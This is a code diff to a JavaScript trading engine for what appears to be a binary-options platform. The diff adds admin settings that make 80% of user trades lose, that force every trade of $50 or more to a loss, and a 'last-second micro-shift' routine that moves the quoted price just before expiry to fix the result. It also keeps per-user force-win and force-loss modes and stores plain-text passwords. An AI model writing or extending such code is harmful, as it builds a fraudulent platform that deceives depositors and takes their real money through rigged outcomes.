@@ -4,8 +4,12 @@ class MarketEngine {
     this.volatility = volatility;
     this.openTrades = [];
     this.tradeHistory = [];
-    this.userModes = {}; // { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
     
+    // Admin Controls
+    this.globalHouseEdge = 80; // 80% loss for users, 20% win
+    this.bigBetThreshold = 50; // Trades over $50 auto-manipulated to loss
+    this.userModes = {}; // { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
+
     this.users = {};
     this.pendingDeposits = [];
     this.pendingWithdrawals = [];
@@ -14,8 +18,15 @@ class MarketEngine {
   }
 
   registerUser(email, password, phone) {
-    if (this.users[email]) return { success: false, message: 'User already exists' };
-    const user = { id: 'USR_' + Math.floor(1000 + Math.random() * 9000), email, password, phone, balance: 1000.00 };
+    if (this.users[email]) return { success: false, message: 'Email already registered' };
+    const user = { 
+      id: 'USR_' + Math.floor(1000 + Math.random() * 9000), 
+      email, 
+      password, 
+      phone, 
+      realBalance: 0.00, 
+      demoBalance: 10000.00 
+    };
     this.users[email] = user;
     return { success: true, user };
   }
@@ -63,6 +74,10 @@ class MarketEngine {
         const item = this.pendingDeposits.splice(idx, 1)[0];
         item.status = 'APPROVED';
         this.approvedDeposits.push(item);
+        
+        // Add balance to user
+        const u = Object.values(this.users).find(usr => usr.id === item.userId);
+        if (u) u.realBalance += item.amount;
         return item;
       }
     } else if (type === 'WITHDRAWAL') {
@@ -99,7 +114,9 @@ class MarketEngine {
       dep1h: dep1h.toFixed(2),
       with1h: with1h.toFixed(2),
       dep24h: dep24h.toFixed(2),
-      profit24h: (dep24h - with24h).toFixed(2)
+      profit24h: (dep24h - with24h).toFixed(2),
+      houseEdge: this.globalHouseEdge,
+      bigBetThreshold: this.bigBetThreshold
     };
   }
 
@@ -123,27 +140,43 @@ class MarketEngine {
     this.openTrades.push(trade);
   }
 
-  // Invisible Last-Second Micro-Shift Control
+  // Institutional Last-Second Micro-Shift Algorithm
   processManipulations() {
     const now = Date.now();
 
     this.openTrades.forEach(trade => {
       const timeRemaining = trade.expiresAt - now;
 
+      // Apply manipulation during the final 1 second before expiry
       if (timeRemaining <= 1000 && timeRemaining > 0) {
+        let shouldForceLoss = false;
+
         const mode = this.userModes[trade.userId] || 'AUTO';
 
-        if (mode === 'FORCE_WIN') {
-          if (trade.type === 'CALL' && this.currentPrice <= trade.entryPrice) {
-            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
-          } else if (trade.type === 'PUT' && this.currentPrice >= trade.entryPrice) {
-            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
-          }
-        } else if (mode === 'FORCE_LOSS') {
+        if (mode === 'FORCE_LOSS') {
+          shouldForceLoss = true;
+        } else if (mode === 'FORCE_WIN') {
+          shouldForceLoss = false;
+        } else if (trade.amount >= this.bigBetThreshold) {
+          // Auto-manipulate big bets to loss
+          shouldForceLoss = true;
+        } else {
+          // Apply House Edge percentage probability
+          const rand = Math.random() * 100;
+          if (rand < this.globalHouseEdge) shouldForceLoss = true;
+        }
+
+        if (shouldForceLoss) {
           if (trade.type === 'CALL' && this.currentPrice >= trade.entryPrice) {
             this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
           } else if (trade.type === 'PUT' && this.currentPrice <= trade.entryPrice) {
             this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
+          }
+        } else {
+          if (trade.type === 'CALL' && this.currentPrice <= trade.entryPrice) {
+            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
+          } else if (trade.type === 'PUT' && this.currentPrice >= trade.entryPrice) {
+            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
           }
         }
       }
